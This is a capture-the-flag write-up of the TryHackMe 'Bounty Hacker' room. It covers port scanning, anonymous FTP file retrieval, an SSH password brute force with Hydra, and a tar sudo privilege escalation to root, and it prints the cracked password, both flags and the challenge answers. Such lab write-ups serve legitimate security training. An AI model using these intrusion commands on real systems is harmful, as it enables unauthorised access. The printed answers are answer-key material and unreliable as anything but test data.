TryHackMe — Bounty Hacker Write‑Up
Insights, Methodology, and Flags
Author: Somnath Adhikary
Write‑Up by Obada

1. Enumeration
The assessment began with a full port scan using RustScan for speed and Nmap for detailed service enumeration.

```bash
sudo rustscan -a 10.10.41.17 -- -A -sC -sV
```
Alternative using Nmap alone:

```bash
sudo nmap 10.10.41.17 -A -sC -sV
```
Key scan options:

-A: Aggressive scan (OS detection, version detection, scripts, traceroute)

-sC: Default NSE scripts

-sV: Service version detection

Open Ports Identified:

Port	Service
21	FTP
22	SSH
80	HTTP
2. FTP Access and File Retrieval
Since port 21 was open, I attempted an anonymous FTP login:

```bash
ftp 10.10.41.17
```
Switched to passive mode:

```bash
ftp> passive
```
Two files were discovered:

locks.txt

task.txt

Downloaded using:

```bash
get locks.txt
get task.txt
```
locks.txt appeared to be a password wordlist, while task.txt contained a note written by the user lin.

3. Brute‑Forcing SSH Credentials
Using Hydra with locks.txt as the wordlist:

```bash
hydra -l lin -P locks.txt ssh://10.10.41.17
```
Credentials Found:

Username: lin

Password: RedDr4gonSynd1cat3

4. SSH Access and User Flag
Logged in via SSH:

```bash
ssh lin@10.10.41.17
```
Retrieved the user flag:

```bash
cat user.txt
```
user.txt:  
THM{CR1M3_SyNd1C4T3}

5. Privilege Escalation
Checked sudo permissions:

```bash
sudo -l
```
The output revealed that the user could run /bin/tar with sudo privileges.

Using GTFOBins, I found a privilege escalation method for tar:

```bash
sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
```
This spawned a root shell.

6. Root Flag
Navigated to the root directory:

```bash
cd /root
ls
cat root.txt
```
root.txt:  
THM{80UN7Y_h4cK3r}

7. Challenge Questions & Answers
Question	Answer
Who wrote the task list?	| lin
What service can you bruteforce with the text file found?	| SSH
What is the user’s password?	| RedDr4gonSynd1cat3
user.txt |	THM{CR1M3_SyNd1C4T3}
root.txt	| THM{80UN7Y_h4cK3r}

SSH compromise

Privilege escalation via misconfigured sudo permissions

All objectives were completed successfully, and both flags were obtained.
